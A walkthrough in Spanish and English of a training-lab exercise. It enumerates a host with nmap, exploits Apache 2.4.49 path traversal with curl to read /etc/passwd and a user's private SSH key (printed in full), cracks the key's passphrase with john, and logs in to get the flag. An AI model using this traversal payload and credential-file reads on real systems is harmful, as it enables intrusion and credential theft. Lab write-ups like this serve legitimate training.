# Walk: SSH Private Key Passphrase - VM #2

## Fecha: 26/06/2025
## Host: Ubuntu
## IP: 192.168.xxx.201
## Objetivo
Enumerate VM #1 and find a way to get access to SSH on port 2223. Find the flag in the home directory of the user alfred. You can use the same rules we created in this section.
## Herramientas
1. curl
2. nmap
3. ssh2john

## Procedimiento y comandos
#### Paso 1: Enumeracion
```bash
┌──(root㉿kali)-[/home/…/OffSec/16-PasswordAttacks/16.2.4-SSH-PrivateKeyPassphrase/02-Challenge]
└─# cat nmap-results.txt
# Nmap 7.95 scan initiated Thu Jun 26 18:58:51 2025 as: /usr/lib/nmap/nmap -sV -sC -Pn -oN nmap-results.txt 192.168.234.201
Nmap scan report for 192.168.234.201
Host is up (0.20s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 d1:1d:d5:a0:66:7e:28:4c:eb:cd:8b:80:5d:af:70:08 (ECDSA)
|_  256 72:9b:a5:49:10:7b:e9:c5:5f:9e:fe:47:50:a8:74:df (ED25519)
80/tcp   open  http    Apache httpd 2.4.49 ((Unix))
|_http-title: Rebuilding..
|_http-server-header: Apache/2.4.49 (Unix)
| http-methods: 
|_  Potentially risky methods: TRACE
2222/tcp open  ssh     OpenSSH 9.0 (protocol 2.0)
8080/tcp open  http    PHP cli server 5.5 or later
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-title: Tiny File Manager
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jun 26 18:59:09 2025 -- 1 IP address (1 host up) scanned in 17.56 seconds
```
* Enumeramos el puerto 2223:
```bash
┌──(root㉿kali)-[/home/…/OffSec/16-PasswordAttacks/16.2.4-SSH-PrivateKeyPassphrase/02-Challenge]
└─# cat 2223-results.txt    
# Nmap 7.95 scan initiated Thu Jun 26 19:14:54 2025 as: /usr/lib/nmap/nmap -sV -sC -p 2223 -Pn -oN 2223-results.txt 192.168.234.201
Nmap scan report for 192.168.234.201
Host is up (0.25s latency).

PORT     STATE SERVICE VERSION
2223/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:11:3a:9a:ba:e9:e7:de:a9:d0:f3:57:90:67:03:7f (RSA)
|   256 93:84:c4:1e:e5:41:51:a4:ab:68:ca:f6:03:f7:47:43 (ECDSA)
|_  256 39:21:bd:51:89:5d:2e:26:14:2b:0f:e0:73:2b:01:5f (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jun 26 19:15:00 2025 -- 1 IP address (1 host up) scanned in 6.70 seconds
```
#### Paso 2: Buscamos exploits:
```bash
┌──(kali㉿kali)-[~]
└─$ searchsploit "Apache 2.4.49"      
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                  |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote Code Execution                                                                                                                 | php/remote/29290.c
Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution + Scanner                                                                                                               | php/remote/29316.py
Apache CXF < 2.5.10/2.6.7/2.7.4 - Denial of Service                                                                                                                             | multiple/dos/26710.txt
Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)                                                                                                        | multiple/webapps/50383.sh
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow                                                                                                            | unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)                                                                                                      | unix/remote/764.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)                                                                                                      | unix/remote/47080.c
Apache OpenMeetings 1.9.x < 3.1.0 - '.ZIP' File Directory Traversal                                                                                                             | linux/webapps/39642.txt
Apache Tomcat < 5.5.17 - Remote Directory Listing                                                                                                                               | multiple/remote/2061.txt
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal                                                                                                                             | unix/remote/14489.c
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal (PoC)                                                                                                                       | multiple/remote/6229.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (1)                                                                    | windows/webapps/42953.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (2)                                                                    | jsp/webapps/42966.py
Apache Xerces-C XML Parser < 3.1.2 - Denial of Service (PoC)                                                                                                                    | linux/dos/36906.txt
Webfroot Shoutbox < 2.32 (Apache) - Local File Inclusion / Remote Code Execution  
```
#### Paso 3: Intentamos con Path Traversal:
```bash
──(root㉿kali)-[/home/…/OffSec/16-PasswordAttacks/16.2.4-SSH-PrivateKeyPassphrase/01-Challenge]
└─# curl --path-as-is http://192.168.234.201/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
alfred:x:1000:1000::/home/alfred:/bin/bash
```
#### Paso 4: Obtenemos el id_rsa
```bash
┌──(root㉿kali)-[/home/…/OffSec/16-PasswordAttacks/16.2.4-SSH-PrivateKeyPassphrase/01-Challenge]
└─# curl --path-as-is http://192.168.234.201/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/alfred/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
tG9DRw==
-----END OPENSSH PRIVATE KEY-----
```
* Lo guardamos en un archvio id_rsa

#### Paso 5: Procesamos el id_rsa
```bash
┌──(root㉿kali)-[/home/…/OffSec/16-PasswordAttacks/16.2.4-SSH-PrivateKeyPassphrase/02-Challenge]
└─# ssh2john id_rsa > ssh.hash
```
#### Paso 6: Crackeamos el hash
```bash
┌──(root㉿kali)-[/home/…/OffSec/16-PasswordAttacks/16.2.4-SSH-PrivateKeyPassphrase/02-Challenge]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt --rules=sshRules ssh.hash
Warning! john.conf section [list.rules:sshrules] is multiple declared.
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Superstar137!    (?)     
1g 0:00:00:27 DONE (2025-06-26 20:33) 0.03608g/s 13.85p/s 13.85c/s 13.85C/s Smokey137!..Michael1137!
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

┌──(root㉿kali)-[/home/…/OffSec/16-PasswordAttacks/16.2.4-SSH-PrivateKeyPassphrase/02-Challenge]
└─# john --show ssh.hash                                                      
Warning! john.conf section [list.rules:sshrules] is multiple declared.
?:Superstar137!

1 password hash cracked, 0 left 
```
#### Paso 7: Nos conectamos y obtenemos el hash

```bash
┌──(root㉿kali)-[/home/…/OffSec/16-PasswordAttacks/16.2.4-SSH-PrivateKeyPassphrase/02-Challenge]
└─# ssh -i id_rsa alfred@192.168.234.201 -p 2223                              
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.15.0-50-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

alfred@38566eabc773:~$ ls
123_flag.txt
alfred@38566eabc773:~$ cat 123_flag.txt 
OS{80674bde0209cb84790d19312428eb51}
alfred@38566eabc773:~$
```

